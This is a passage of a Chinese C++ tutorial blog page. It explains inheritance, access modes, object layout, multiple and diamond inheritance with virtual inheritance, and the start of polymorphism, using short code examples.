class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">python</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面上方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面下方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面左方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">right</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面右方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pythonvideo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是python的视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面上方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面下方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面左方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">right</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面右方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cvideo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是C的视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面上方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面下方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面左方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">right</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面右方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">javavideo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是java的视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">C a;</span><br><span class="line">python b;</span><br><span class="line">java c;</span><br><span class="line"></span><br><span class="line">a.down();</span><br><span class="line">a.up();</span><br><span class="line">a.left();</span><br><span class="line">a.right();</span><br><span class="line">a.cvideo();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">b.down();</span><br><span class="line">b.up();</span><br><span class="line">b.left();</span><br><span class="line">b.right();</span><br><span class="line">b.pythonvideo();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">c.down();</span><br><span class="line">c.up();</span><br><span class="line">c.left();</span><br><span class="line">c.right();</span><br><span class="line">c.javavideo();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，存在大量的重复代码，用继承就可以减少重复代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">base</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面上方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面下方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">left</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面左方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">right</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是页面右方&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">python</span> :</span><span class="keyword">public</span> base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pythonvideo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是python的视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> :</span><span class="keyword">public</span> base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cvideo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是C的视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">java</span> :</span><span class="keyword">public</span> base</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">javavideo</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;这里是java的视频&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">C a;</span><br><span class="line">python b;</span><br><span class="line">java c;</span><br><span class="line"></span><br><span class="line">a.down();</span><br><span class="line">a.up();</span><br><span class="line">a.left();</span><br><span class="line">a.right();</span><br><span class="line">a.cvideo();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">b.down();</span><br><span class="line">b.up();</span><br><span class="line">b.left();</span><br><span class="line">b.right();</span><br><span class="line">b.pythonvideo();</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;-------------------------------&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">c.down();</span><br><span class="line">c.up();</span><br><span class="line">c.left();</span><br><span class="line">c.right();</span><br><span class="line">c.javavideo();</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2.继承方式</p><p>有三种继承方式，public，private，protected、<br><img src="https://i.loli.net/2021/07/24/ZsvEhPBVcFT5j3g.png"><br>看完这个图就差不多了。</p><p>3.继承中的对象模型</p><p>虽然父类的私有成员在子类还是无法访问，但是是会被继承下去的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_a;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line"><span class="keyword">int</span> m_b;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="keyword">int</span> m_c;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> :</span><span class="keyword">public</span> father</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//16，所以私有成员还是继承了的。</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="keyword">sizeof</span>(son) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如何看son的成员呢，用vs的工具，在菜单栏vs2019中的Developer Command Prompt。</p><p>先进入cpp的文件目录下，然后 </p><pre><code>cl /d1 reportSingleClassLayout查看的类名   所属文件名</code></pre><p>就可以看成员结构了。</p><p>4.继承中构造和析构顺序</p><p>子类继承父类后，当创建子类对象，也会调用父类的构造函数，问题：父类和子类的构造和析构顺序是谁先谁后？</p><p>当然是有父才有子咯，而且类似于类成员中有类成员，父类都是先构造，最后析构。</p><p>5.继承同名成员，静态成员处理方式</p><ul><li>访问子类同名成员   直接访问即可</li><li>访问父类同名成员   需要加作用域</li></ul><p>静态成员还可以通过类名进行访问</p><p>6.继承多个类</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_a=<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mather</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_b=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> :</span><span class="keyword">public</span> father, <span class="keyword">public</span> mather</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">son m;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m.m_a &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m.m_b &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>7.菱形继承</p><p>例子</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">grandfather</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_num=<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father1</span> :</span><span class="keyword">public</span> grandfather</span><br><span class="line">&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father2</span> :</span><span class="keyword">public</span> grandfather</span><br><span class="line">&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> :</span><span class="keyword">public</span> father1, <span class="keyword">public</span> father2</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">son m;</span><br><span class="line">m.father1::m_num = <span class="number">2</span>;</span><br><span class="line">m.father2::m_num = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m.father1::m_num&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m.father1::m_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 2</span></span><br></pre></td></tr></table></figure><p>可以看到，m.father1::m_num = 2;    m.father2::m_num = 3;，都是指的同一个东西，导致资源浪费以及毫无意义。这时候就可以用虚继承了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">grandfather</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_num=<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father1</span> :</span><span class="keyword">virtual</span> <span class="keyword">public</span> grandfather</span><br><span class="line">&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">father2</span> :</span><span class="keyword">virtual</span> <span class="keyword">public</span> grandfather</span><br><span class="line">&#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">son</span> :</span><span class="keyword">public</span> father1, <span class="keyword">public</span> father2</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="keyword">int</span> m_d;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">son m;</span><br><span class="line">m.father1::m_num = <span class="number">2</span>;</span><br><span class="line">m.father2::m_num = <span class="number">3</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m.father1::m_num&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; m.father1::m_num &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//2 2</span></span><br></pre></td></tr></table></figure><p>在继承前面加个virtual，就行了，实质就变为了用偏移，可以用vs工具去看看。</p><h4 id="多态"><a href="#多态" class="headerlink" title="多态"></a>多态</h4><p>c++的第三个特征，多态</p><p>多态分为两类</p><ul><li>静态多态: 函数重载 和 运算符重载属于静态多态，复用函数名</li><li>动态多态: 派生类和虚函数实现运行时多态</li></ul><p>静态多态和动态多态区别：</p><ul><li>静态多态的函数地址早绑定  -  编译阶段确定函数地址</li><li>动态多态的函数地址晚绑定  -  运行阶段确定函数地址</li></ul><p>1.多态的基本概念</p><p>多态满足条件： </p><ul><li>1、有继承关系</li><li>2、子类重写父类中的虚函数</li></ul><p>多态使用：父类指针或引用指向子类对象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Animal</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="comment">//这里加个virtual就代表虚函数，继承实际上就一个表，Dog中的同名函数会覆盖Animal的函数。</span></span><br><span class="line"> <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;this is Animal&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Dog</span> :</span><span class="keyword">public</span> Animal</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">speak</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;this is dog&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(Animal&amp; animal)</span><span class="comment">//这里即使需要Animal类，但是由于继承，是可以传入dog类的</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">animal.speak();</span><br><span class="line">&#125;</span><br><span class="line"><span 